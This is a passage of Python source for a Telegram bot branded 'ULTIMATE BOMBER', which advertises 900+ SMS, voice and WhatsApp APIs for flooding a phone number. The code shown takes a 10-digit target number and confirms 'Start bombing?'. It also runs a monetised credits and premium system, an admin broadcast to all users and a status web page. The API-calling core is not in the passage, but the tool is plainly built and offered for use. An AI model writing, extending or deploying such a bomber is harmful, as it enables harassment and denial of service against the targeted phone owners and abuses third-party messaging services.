    if not await check_force_join(user_id, context): return
    
    if state == PHONE_NUMBER:
        if not text.isdigit() or len(text) != 10:
            await update.message.reply_text("❌ Invalid! Enter 10 digits.")
            return
        context.user_data["target_phone"] = text
        kb = [[InlineKeyboardButton("✅ START", callback_data="confirm_yes"), InlineKeyboardButton("❌ CANCEL", callback_data="confirm_no")]]
        await update.message.reply_text(f"🎯 Target: `{text}`\nStart bombing?", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        context.user_data["state"] = CONFIRM_START
        return
    
    elif context.user_data.get("admin_action"):
        action = context.user_data["admin_action"]
        if action == "broadcast":
            count = 0
            for uid in all_users:
                try: await context.bot.send_message(uid, text); count += 1; await asyncio.sleep(0.05)
                except: pass
            await update.message.reply_text(f"📢 Sent to {count} users.")
        elif action == "add_credits":
            parts = text.split()
            if len(parts) == 2:
                try:
                    uid, amt = int(parts[0]), int(parts[1])
                    if amt > 0:
                        curr = user_credits.get(str(uid), 0)
                        user_credits[str(uid)] = curr + amt
                        save_credits()
                        await update.message.reply_text(f"✅ Added {amt} credits to {uid}")
                except: await update.message.reply_text("Invalid!")
        elif action == "add_premium":
            parts = text.split()
            if len(parts) == 2:
                try:
                    uid, days = int(parts[0]), int(parts[1])
                    premium_users[str(uid)] = time.time() + (days * 86400)
                    save_premium()
                    await update.message.reply_text(f"✅ Premium added to {uid} for {days} days")
                except: await update.message.reply_text("Invalid!")
        context.user_data.pop("admin_action", None)
        return
    else:
        await start(update, context)

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled.")
    context.user_data.clear()

# ==================== WEB SERVER ====================
async def handle_health(request): return web.Response(text="✅ Bot Alive!", status=200)
async def handle_home(request):
    return web.Response(text="""<!DOCTYPE html><html><head><title>ULTIMATE BOMBER</title></head>
<body style="background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:50px;">
<h1>🔥 ULTIMATE BOMBER BOT 🔥</h1><p>900+ APIs | SMS + Voice + WhatsApp</p>
<p>Status: 🟢 ONLINE</p><p>Owner: @abhigyan_codes</p></body></html>""", content_type='text/html', status=200)

async def start_web_server():
    try:
        app = web.Application()
        app.router.add_get('/', handle_home)
        app.router.add_get('/health', handle_health)
        port = int(os.environ.get('PORT', 8080))
        runner = web.AppRunner(app); await runner.setup()
        await web.TCPSite(runner, '0.0.0.0', port).start()
        logger.info(f"Web server on port {port}")
    except Exception as e: logger.error(f"Web server error: {e}")

# ==================== MAIN ====================
async def main_async():
    asyncio.create_task(start_web_server())
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CommandHandler("cancel", cancel))
    
    print("""
╔═══════════════════════════════════════════════════════════╗
║     🔥 ULTIMATE TELEGRAM BOMBER - 900+ APIS 🔥           ║
║                                                           ║
║     • 900+ SMS + Voice + WhatsApp APIs                  ║
║     • Credits + Daily Bonus + Referral                  ║
║     • Premium (4 hours) vs Free (10 min)                ║
║     • Force Join + Admin Panel                          ║
║                                                           ║
║     Owner: @abhigyan_codes                                 ║
║     Status: 🟢 ONLINE                                    ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    while True: await asyncio.sleep(3600)

def main():
    asyncio.run(main_async())

if __name__ == "__main__":
    main()